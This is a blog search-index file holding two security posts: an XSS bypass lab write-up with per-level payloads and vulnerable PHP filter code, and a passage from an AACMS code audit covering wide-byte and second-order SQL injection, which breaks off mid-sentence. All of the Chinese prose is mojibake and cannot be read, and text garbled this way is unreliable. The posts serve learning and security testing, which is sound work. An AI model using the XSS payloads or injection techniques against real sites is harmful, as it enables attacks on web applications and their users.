<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xss_bypassé¶åœº</title>
    <link href="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/"/>
    <url>/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="XSS-bypassé¶åœº"><a href="#XSS-bypassé¶åœº" class="headerlink" title="XSS bypassé¶åœº"></a>XSS bypassé¶åœº</h3><h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>å¶ç„¶æ—¶é—´çœ‹åˆ°ä¸€ä¸ªxss bypassçš„é¶åœºï¼Œå› ä¸ºæ­£åœ¨å¯¹ä¸€ä¸ªxssçš„è¿‡æ»¤è§„åˆ™è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥é¡ºæ‰‹ç©äº†ä¸€ä¸‹ï¼Œæ•…è®°å½•ä¸€æ‰‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/moeinfatehi/xss_vulnerability_challenges// é¡¹ç›®åœ°å€<br></code></pre></td></tr></table></figure><h4 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h4><p>è¿™å…³æ²¡ä»€ä¹ˆï¼Œå‰ç«¯jsçš„é™åˆ¶ï¼Œå¯ä»¥ç¦ç”¨æ‰æµè§ˆå™¨çš„jsï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠ“åŒ…è¿‡ï¼Œä½†ä¸ªäººæ¨èè¿˜æ˜¯ç›´æ¥æŠ“åŒ…è¿‡ï¼Œå› ä¸ºç¦ç”¨jsçš„è¯å¯èƒ½ä¼šå¯¼è‡´é¡µé¢åŠ è½½å‡ºç°ä¸€äº›å°é—®é¢˜</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/1.png"></p><h4 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h4><p>è¿™ä¸€å…³å°±æ˜¯ç®€å•çš„è¿›è¡Œæ„é€ ä¸€ä¸‹æ ‡ç­¾</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/2.png"></p><p>å¯ä»¥çœ‹åˆ°è¾“å…¥åœ¨<code>input</code>æ ‡ç­¾ä¸­ä½“ç°å‡ºæ¥ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€ <code>payload</code>:<code>11&quot; onclick=alert(/xxx/)&gt;</code></p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/3.png"></p><h4 id="XSS3"><a href="#XSS3" class="headerlink" title="XSS3"></a>XSS3</h4><p>è¿™ä¸€å…³è€ƒçš„åº”è¯¥æ˜¯jsçš„åŸºç¡€ï¼Œé¦–å…ˆè¾“å…¥ä¸ª111</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/4.png"></p><p>æŸ¥çœ‹ç½‘é¡µæºç èƒ½å¤Ÿå‘ç°è¿™ä¸ª<code>111</code>è¢«å­˜å‚¨ä¸ºå˜é‡nameçš„å€¼</p><p>ä½†å¯ä»¥å°†è¿™ä¸ªå£°æ˜å˜é‡çš„è¯­å¥è¿›è¡Œé—­åˆï¼Œç„¶åç›´æ¥æ‰§è¡Œ<code>payload</code>:<code>111&quot;;alert(/xxx/);//</code></p><p>æ³¨æ„éœ€è¦æ³¨é‡Š</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/5.png"></p><p>å½“å‰ä¹Ÿå¯ä»¥åˆ©ç”¨ä¸€äº›å…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚<code>eval()</code>ã€<code>new Function()</code>ç­‰</p><p><code>alert(/xxx/)&quot;;eval(name);//</code></p><h4 id="XSS4"><a href="#XSS4" class="headerlink" title="XSS4"></a>XSS4</h4><p>è¿™å…³ï¼Œå·²ç»ç›´ç™½çš„è¯´äº†ä¸èƒ½ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œé‚£å°±æ¢ä¸ªæ ‡ç­¾ï¼Œç„¶åå°±æ˜¯å‰ç«¯é™åˆ¶äº†ï¼Œæ²¡å•¥çš„</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/6.png"></p><h4 id="XSS5"><a href="#XSS5" class="headerlink" title="XSS5"></a>XSS5</h4><p>è¿™å…³ç¦ç”¨äº†<code>&lt; &gt;</code>ï¼Œç¦ç”¨äº†å°–æ‹¬å·å°±ä¸å¥½æ„é€ æ ‡ç­¾äº†ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨ç¼–ç ï¼Œä¼˜å…ˆæƒ³åˆ°çš„å°±æ˜¯urlç¼–ç </p><p>æŠŠå°–æ‹¬å·æ›´æ”¹ä¸ºurlç¼–ç çš„å½¢å¼ï¼Œç„¶åå°±å¯ä»¥ç›´æ¥è¿‡äº†</p><p><code>payload</code>:<code>111&quot; onclick=alert(/xxx/)%3e</code></p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/7.png"></p><h4 id="XSS6"><a href="#XSS6" class="headerlink" title="XSS6"></a>XSS6</h4><p>è¿™å…³è¿‡æ»¤äº†åŒå¼•å·<code>&quot;</code></p><p>ä½†å¥½åƒæ²¡å¤ªç†è§£ä½œè€…çš„æ„æ€ï¼Œè¾“å…¥åŒå¼•å·ä¹‹åï¼Œä¼šè¿›è¡Œè½¬ä¹‰ï¼Œå˜æˆ<code>\&quot;</code>ï¼Œè€ŒåŒå¼•å·åˆèƒ½å¤Ÿæ­£å¸¸è¿›è¡ŒåŠ è½½æ‰§è¡Œ</p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥<code>111&quot; onclick=alert(/xxx/)&gt;</code></p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/8.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xss6æºç </span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xss_check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities</span><br><span class="hljs-comment">//    $input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);</span><br><span class="hljs-comment">//    $input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);</span><br>    <span class="hljs-variable">$input</span> = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-comment">// Failure is an option</span><br>    <span class="hljs-comment">// Bypasses double encoding attacks</span><br>    <span class="hljs-comment">// &lt;script&gt;alert(0)&lt;/script&gt;</span><br>    <span class="hljs-comment">// %3Cscript%3Ealert%280%29%3C%2Fscript%3E</span><br>    <span class="hljs-comment">// %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E</span><br>    <span class="hljs-variable">$input</span> = urldecode(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ„Ÿè§‰æœ‰ç‚¹å‡ºä¹ä½œè€…çš„æƒ³æ³•ï¼Œçœ‹æ ·å­ä½œè€…æœ¬èº«æ˜¯æƒ³è¦è®©ä½¿ç”¨ç¼–ç æˆ–è€…ä¸€äº›æ²¡æœ‰åŒå¼•å·çš„<code>payload</code>æ¥è¿‡è¿™é‡Œï¼Œç»“æœä¸æ›¾æƒ³åŒå¼•å·æ˜¯èƒ½å¤Ÿç›´æ¥åŠ è½½æˆåŠŸçš„ğŸ¤£</p><h4 id="XSS7"><a href="#XSS7" class="headerlink" title="XSS7"></a>XSS7</h4><p>è¿™å…³è¿‡æ»¤äº†åŒå¼•å·ï¼Œä¸€å¯¹å°–æ‹¬å·ï¼Œç›´æ¥è¾“å…¥çš„è¯ä¼šè¿”å›htmlå®ä½“åŒ–ç¼–ç çš„å½¢å¼ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç›´æ¥ç”¨urlç¼–ç è¿‡</p><p><code>payload</code>:<code>111%22 onclick=alert(/xxx/)%3e</code></p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/9.png"></p><h4 id="XSS8"><a href="#XSS8" class="headerlink" title="XSS8"></a>XSS8</h4><p>è¿™å…³ç›´æ¥æ‘†æ˜ï¼Œç”¨çš„<code>htmlentities()</code>ç¨ç¨çœ‹ä¸€ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xss8æºç </span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xss_check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> htmlentities(<span class="hljs-variable">$data</span>, ENT_QUOTES);<span class="hljs-comment"># ç¼–ç åŒå¼•å·å’Œå•å¼•å·ã€‚</span><br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>emmmğŸ˜­ï¼Œè¿™ä¸ªæˆ‘è§‰ç€å¾ˆå®‰å…¨</p><p>æ²¡æœ‰ç»å¯¹çš„å®‰å…¨ï¼Œå…¶å®å°±æ˜¯èœ</p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/10.png" style="zoom:60%;">]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»£ç å®¡è®¡-AACMS</title>
    <link href="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/"/>
    <url>/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/</url>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ç®—æ˜¯ç¬¬ä¸€æ¬¡å®¡cmså§ï¼Œå‚è€ƒå­¦ä¹ äº†è¿™ä½å¤§å“¥çš„æ€è·¯ï¼Œæ•…è®°å½•ä¸€ä¸‹ï¼Œemmmï¼Œèœé¸¡çš„æˆ‘è¿˜ä¸é…è‡ªå·±å»å®¡ï¼Œåªèƒ½å…ˆæ‰¾æ–‡ç« ä¸€è¾¹å‚è€ƒå­¦ä¹ ä¸€è¾¹å®¡ã€‚</p><h4 id="å®¡è®¡è¿‡ç¨‹"><a href="#å®¡è®¡è¿‡ç¨‹" class="headerlink" title="å®¡è®¡è¿‡ç¨‹"></a>å®¡è®¡è¿‡ç¨‹</h4><h5 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h5><p>PHP5.2.17</p><p>MySQL5.7.26</p><p>Apache2.4.39</p><h5 id="ç¨‹åºå®‰è£…"><a href="#ç¨‹åºå®‰è£…" class="headerlink" title="ç¨‹åºå®‰è£…"></a>ç¨‹åºå®‰è£…</h5><p>å…ˆå¤§è‡´æµè§ˆä¸‹è¯¥cmsçš„ç›®å½•ç»“æ„ï¼Œä¸‰ä¸ªå…¥å£å‡½æ•°ï¼Œå…¶ä»–çš„åŸºæœ¬ä¸Šå¦‚å›¾æ‰€æè¿°çš„é‚£æ ·ã€‚</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png"></p><p>å®‰è£…è¯¥cmsï¼Œé…ç½®å¥½ç½‘ç«™ä¹‹åç›´æ¥è®¿é—®/install/index.phpå³å¯ï¼Œæœ‰ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæ•°æ®åº“é»˜è®¤å­—ç¬¦é›†ä¸ºGBKï¼Œè¿™å°±å¯èƒ½å¯¼è‡´å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png"></p><h5 id="å…¥å£å‡½æ•°åˆ†æ"><a href="#å…¥å£å‡½æ•°åˆ†æ" class="headerlink" title="å…¥å£å‡½æ•°åˆ†æ"></a>å…¥å£å‡½æ•°åˆ†æ</h5><h6 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png"></p><p>å…ˆåŒ…å«class_core.phpï¼Œç„¶åè°ƒç”¨è¯¥æ–‡ä»¶ä¸­çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œæœ€ååŒ…å«æ–‡ç« æ¨¡æ¿ç›®å½•ä¸‹çš„indexæ–‡ä»¶</p><p>è·Ÿè¿›class_core.phpæ–‡ä»¶æŸ¥çœ‹ï¼Œå…ˆæ˜¯å®šä¹‰äº†ä¸€ä¸ªå¸¸é‡ï¼Œåå®šä¹‰äº†äº”ä¸ªç±»ï¼Œæ‰¾åˆ°åˆšåˆšindex.phpä¸­è°ƒç”¨çš„æ–¹æ³•</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> &amp; <span class="hljs-title">instance</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-comment">// å®ä¾‹åŒ–äº†è‡ªå·±æœ¬èº«çš„å¯¹è±¡ï¼šå•ä¾‹æ¨¡å¼</span><br><span class="hljs-built_in">static</span> <span class="hljs-variable">$object</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$object</span>)) &#123;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> core();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†çœ‹<code>init()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// è°ƒç”¨è¯¥ç±»ä¸­çš„ä¸€äº›å…¶ä»–æ–¹æ³•</span><br><br><span class="hljs-keyword">$this</span>-&gt;_init_db();<br><span class="hljs-keyword">$this</span>-&gt;_init_memory();<br><span class="hljs-keyword">$this</span>-&gt;_init_session();<span class="hljs-comment">// åˆå§‹åŒ–session</span><br><span class="hljs-keyword">$this</span>-&gt;_init_setting();<span class="hljs-comment">//</span><br><span class="hljs-keyword">$this</span>-&gt;_init_misc();<span class="hljs-comment">//åˆå§‹åŒ–æ—¶åŒº</span><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_db</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// åˆ›å»ºæ•°æ®åº“è¿æ¥</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br><br><span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql&#x27;</span>;<br><span class="hljs-keyword">if</span>(count(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;slave&#x27;</span>])) &#123;<span class="hljs-comment">// configä¸­æ ¹æœ¬æ²¡æœ‰è¯¥å†…å®¹ï¼Œæ‰€ä»¥æ— æ³•è¿›å…¥</span><br><span class="hljs-keyword">require_once</span> libfile(<span class="hljs-string">&#x27;class/mysql_slave&#x27;</span>);<br><span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql_slave&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">$this</span>-&gt;db = &amp; DB::object(<span class="hljs-variable">$class</span>);<br><span class="hljs-keyword">$this</span>-&gt;db-&gt;set_config(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>]);<br><span class="hljs-keyword">$this</span>-&gt;db-&gt;connect();<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¼•å…¥äº†$_Gè¿™ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶ä¸”æ ¹æ®è¯¥å…¨å±€å˜é‡çš„å€¼è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œè€ŒPHPä¸­å¹¶æ²¡æœ‰ç»™å‡ºè¿™ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶ä¸”åœ¨å‰é¢ä¹Ÿæ²¡æœ‰å¯¹è¯¥å˜é‡çš„å€¼è¿›è¡Œä¸€ä¸ªå®šä¹‰æ“ä½œï¼Œæ‰€ä»¥ï¼Œéœ€è¦å¯»æ‰¾ä¸€ä¸‹è¯¥å…¨å±€å˜é‡æ˜¯ä»å“ªé‡Œæ¥çš„ã€‚</p><p>PHPåœ¨å®ä¾‹åŒ–ç±»æ—¶ï¼Œä¼šè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œè€Œæ„é€ æ–¹æ³•åˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯__construct é­”æœ¯æ–¹æ³•ï¼›å¦ä¸€ç§æ˜¯å°†æˆå‘˜æ–¹æ³•å®šä¹‰ä¸ºç±»åã€‚è¿™é‡Œæ²¡æœ‰ä½¿ç”¨é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯ç›´æ¥ä½¿ç”¨çš„ä¸ç±»åç›¸åŒçš„æˆå‘˜æ–¹æ³•ï¼Œæ‰¾åˆ°è¯¥æ–¹æ³•ï¼Œè·Ÿè¿›å¹¶ç®€ç­”åˆ†ææ¯ä¸€ä¸ªæ–¹æ³•çš„ä½œç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">core</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// çœ‹åå­—éƒ½çŸ¥é“æ˜¯ä¸€å †åˆå§‹åŒ–</span><br><span class="hljs-keyword">$this</span>-&gt;_init_env();<span class="hljs-comment">// å±è”½é”™è¯¯ä¿¡æ¯ã€è®¾ç½®sessionã€è®¾ç½®XXFå¤´ï¼Œå¯¹$_Gè¿›è¡Œä¸€å®šçš„èµ‹å€¼</span><br><span class="hljs-keyword">$this</span>-&gt;_init_config();<span class="hljs-comment">// å°†é…ç½®æ–‡ä»¶å…¨éƒ¨å†™å…¥åˆ°$_Gä¸­</span><br><span class="hljs-keyword">$this</span>-&gt;_init_input();<span class="hljs-comment">// å°†GET\POST\COOKIE\FILEç­‰è¾“å…¥å…¨éƒ¨è¿›è¡Œé­”æœ¯å¼•å·è¿‡æ»¤</span><br><span class="hljs-keyword">$this</span>-&gt;_init_output();<span class="hljs-comment">// å®šä¹‰OBç¼“å†²æœºåˆ¶ï¼Œå³è¿”å›åŒ…ç›¸å…³å†…å®¹</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ°<code>init()</code>æ–¹æ³•ä¸­è°ƒç”¨çš„<code>__init_db()</code>æ–¹æ³•ï¼Œè·Ÿè¿›ï¼Œç¡®å®šè¯¥æ–¹æ³•æ˜¯ç”¨æ¥å»ºç«‹æ•°æ®åº“é“¾æ¥ï¼Œ/config/config_global.phpä¸­è¯»å–ç›¸å…³é…ç½®ä¿¡æ¯ï¼Œç„¶åè¿›è¡Œç®€å†æ•°æ®åº“é“¾æ¥</p><p>è·Ÿè¿›<code>_init_memory()</code>æ–¹æ³•ï¼Œå‘ç°æ˜¯åˆå§‹åŒ–memory</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_memory</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// åˆå§‹åŒ–memory</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br><br><span class="hljs-keyword">$this</span>-&gt;mem = <span class="hljs-keyword">new</span> memory();<span class="hljs-comment">// å®ä¾‹åŒ–memoryç±»</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;init_memory) &#123;<br><span class="hljs-keyword">$this</span>-&gt;mem-&gt;init(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;memory&#x27;</span>]);<br>&#125;<br><span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;memory&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;mem-&gt;type;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åé¢çš„ä¹Ÿéƒ½æ˜¯ä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œæ‰€ä»¥å›åˆ°index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;index&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>template()</code>,å…¶å®å°±æ˜¯å°†æ•°æ®åº“ä¸­çš„æ–‡ç« æ˜¾ç¤ºåœ¨index.phpä¸­</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png"></p><p>index.phpåˆ†æå®Œäº†ï¼Œç»“æœæ˜¯æ²¡æœ‰ä»»ä½•å‘ç°ï¼Œä½†å¯¹è¯¥CMSæœ‰äº†ä¸€å®šçš„äº†è§£ã€‚ç»§ç»­åˆ†æå…¶ä»–çš„å…¥å£å‡½æ•°</p><h6 id="article-php"><a href="#article-php" class="headerlink" title="article.php"></a>article.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png"></p><p>è·Ÿéšå¤§å“¥çš„æ€è·¯ï¼Œçœ‹ä¸€ä¸‹article_view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;IN_AACMS&#x27;</span>)) &#123;<span class="hljs-comment">// è¯¥å€¼å‰é¢å®šä¹‰è¿‡ï¼Œä¸ºTrue</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Access Denied&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$aid</span> = intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]);<span class="hljs-comment">// è·å–aid</span><br><span class="hljs-variable">$article</span> = DB::getRow(<span class="hljs-string">&#x27;SELECT * FROM &#x27;</span>.DB::table(<span class="hljs-string">&#x27;article&#x27;</span>).<span class="hljs-string">&quot; WHERE aid=&#x27;<span class="hljs-subst">$aid</span>&#x27;&quot;</span>);<span class="hljs-comment">// æ ¹æ®aidè¿”å›æ–‡ç« </span><br><br><br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;article/view&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡è®°å½•ï¼Œå› ä¸ºè¯¥è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µéƒ½ä¸èƒ½ä¸ºnullï¼Œæ‰€ä»¥åªèƒ½æ‰€æœ‰çš„éƒ½æ·»åŠ ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (1, 1, &#x27;aacms ä»£ç å®¡è®¡&#x27;, 1, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, &#x27;ä»£ç å®¡è®¡&#x27;, &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨ä¸­è¿›è¡Œè®¿é—®</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png"></p><p>ä»è¿™é‡Œå¼€çœ‹ï¼Œå¦‚æœåœ¨æ’å…¥titleå’Œcontentæ—¶å†…å®¹å¯æ§ï¼Œåˆ™å¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼›æ¯”å¦‚æ‰§è¡Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (2, 2,database(), 2, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, user(), &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png"></p><p>å›åˆ°article.phpï¼Œè¿™é‡Œæ¥æ”¶äº†ä¸€ä¸ªaidï¼Œä½†æ˜¯aidç»è¿‡<code>intval()</code>çš„å¤„ç†äº†ï¼Œè€Œ<code>intval()</code>å‡½æ•°çš„è¿”å›å˜é‡ 